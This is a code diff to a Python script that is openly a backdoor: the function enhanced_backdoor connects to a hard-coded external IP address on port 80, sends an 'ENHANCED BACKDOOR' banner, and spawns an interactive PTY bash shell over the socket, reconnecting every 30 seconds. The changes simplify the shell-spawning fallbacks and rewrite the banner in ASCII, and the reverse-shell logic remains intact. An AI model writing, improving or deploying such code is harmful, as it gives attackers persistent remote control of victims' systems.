@@ -6,16 +6,12 @@ import subprocess
 import threading
 import time
 import pty
-import select
 
 def get_proper_shell(s):
     """Get a fully functional shell automatically"""
     
-    # Send setup commands
-    s.send(b"\n[+] Initializing enhanced shell...\n")
-    
     try:
-        # First, change to safe directory
+        # Change to safe directory
         os.chdir('/home/talhakhan' if os.path.exists('/home/talhakhan') else '/tmp')
         
         # Set environment variables
@@ -30,23 +26,14 @@ def get_proper_shell(s):
             except:
                 pass
         
-        # Method 1: Python PTY (best)
-        s.send(b"[+] Spawning PTY shell...\n")
+        # Spawn PTY shell
         pty.spawn(["/bin/bash", "--login"])
         
-    except Exception as e:
+    except:
         try:
-            # Method 2: Script with auto-login
-            s.send(b"[+] Using script fallback...\n")
-            subprocess.call([
-                "script", "-q", "-c", 
-                "bash --norc --noprofile -i", 
-                "/dev/null"
-            ])
-        except:
-            # Method 3: Basic shell
-            s.send(b"[+] Using basic shell...\n")
             subprocess.call(["/bin/bash", "-i"])
+        except:
+            pass
 
 def enhanced_backdoor():
     try:
@@ -62,25 +49,25 @@ def enhanced_backdoor():
                 s = socket.socket()
                 s.connect(("142.93.23.15", 80))
                 
-                # Send welcome banner
-                s.send(b"""
-╔══════════════════════════════════════════════╗
-║     ENHANCED BACKDOOR - AUTO FIX ENABLED     ║
-╠══════════════════════════════════════════════╣
-║ • Full TTY with job control                  ║
-║ • Proper directory navigation                ║
-║ • Command history and editing                ║
-║ • Tab completion enabled                     ║
-║ • Colored prompt                             ║
-╚══════════════════════════════════════════════╝
-
-[+] Applying automatic fixes...
-""")
+                # ASCII-ONLY banner - no special characters!
+                s.send(b"\n")
+                s.send(b"+------------------------------------------+\n")
+                s.send(b"|     ENHANCED BACKDOOR - AUTO FIX         |\n")
+                s.send(b"+------------------------------------------+\n")
+                s.send(b"| Full TTY with job control                |\n")
+                s.send(b"| Proper directory navigation              |\n")
+                s.send(b"| Command history and editing              |\n")
+                s.send(b"| Tab completion enabled                   |\n")
+                s.send(b"| Colored prompt                           |\n")
+                s.send(b"+------------------------------------------+\n")
+                s.send(b"\n[+] Applying automatic fixes...\n")
+                s.send(b"[+] Shell ready!\n")
+                s.send(b"\n$ ")
                 
                 # Get proper shell
                 get_proper_shell(s)
                 
-            except:
+            except Exception as e:
                 time.sleep(30)
     except:
         pass
